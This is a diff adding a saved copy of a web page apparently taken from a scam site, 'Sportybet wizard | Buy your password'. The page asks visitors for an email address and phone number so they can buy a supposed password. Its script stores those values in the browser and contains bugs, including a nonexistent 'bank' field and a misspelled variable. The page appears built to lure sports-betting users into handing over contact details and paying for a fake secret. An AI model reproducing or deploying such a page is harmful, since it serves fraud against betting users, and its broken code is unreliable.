@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<!-- saved from url=(0048)https://allappsreveiws.com.ng/sportybet/buy.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="https://allappsreveiws.com.ng/sportybet/unnamed.png">
+<script src="./payment_files/jquery.min.js.download"></script>
+<title>Sportybet wizard | Buy your password</title>
+</head>
+<body>
+<link href="./payment_files/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
+<style>
+* {
+            margin: 0;
+            box-sizing: border-box;
+}
+        body {
+            color: red;
+            background: whitesmoke;
+            font-weight: 600;
+            font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif;
+            font-size: 14px;
+            padding: 10px;
+        }
+
+        input {
+            border: 1px solid red;
+            color: red;
+        }
+        input:focus {
+            border: 1px solid red;
+            box-shadow: 1px solid red;
+            outline: none;
+        }
+        button {
+            color: red;
+            padding: 0.7em 1.7em;
+            border-radius: 0.5em;
+            background: #e8e8e8;
+            border: 1px solid #e8e8e8;
+            transition: all .3s;
+            box-shadow: 6px 6px 12px #c5c5c5,
+            -6px -6px 12px #ffffff;
+            font-weight: 600;
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+            font-size: 14px;
+}
+
+button:active {
+            color: #666;
+            box-shadow: inset 4px 4px 12px #c5c5c5, inset -4px -4px 12px #ffffff;
+}
+
+input:focus {
+            outline: none;
+            border: 1px solid red;
+            box-shadow:  0 0 5px #000;
+        }
+</style>
+<center>
+<form action="purchase.html">
+    <br>
+<h3>Input your details</h3><br>
+<p style="font-weight: normal;">Input your email, we will send the Password there and if we could not reach your email we will send it as a SMS (Message)</p>
+<br>
+<input type="email" id="txt" placeholder="Enter Email Address" required="" style="width: 250px; height: 40px; border-radius: 5px; font-weight: normal; box-shadow: red"><br><br>
+<input type="tel" id="name" placeholder="Phone Number" required="" maxlength="11" style="width: 250px; height:40px; border-radius: 5px; font-weight: normal; box-shadow: red;" oninvalid="this.setCustomValidity(&#39;This Phone Number is invalid&#39;)" oninput="setCustomValidity(&#39;&#39;)"><br><br>
+<button onclick="passvalue();">Buy Now</button>
+<br>
+</form>
+</center>
+<script>
+function passvalue(){
+var firstname=document.getElementById("txt").value;
+localStorage.setItem("textvalue", firstname);
+
+var lastname=document.getElementById("name").value;
+localStorage.setItem("textname", lastname);
+
+var middlename=document.getElementById("bank").value;
+localStorage.setItem("textmiddle", middlname);
+
+
+}
+</script>
+
+
+
+
+
+</body></html>
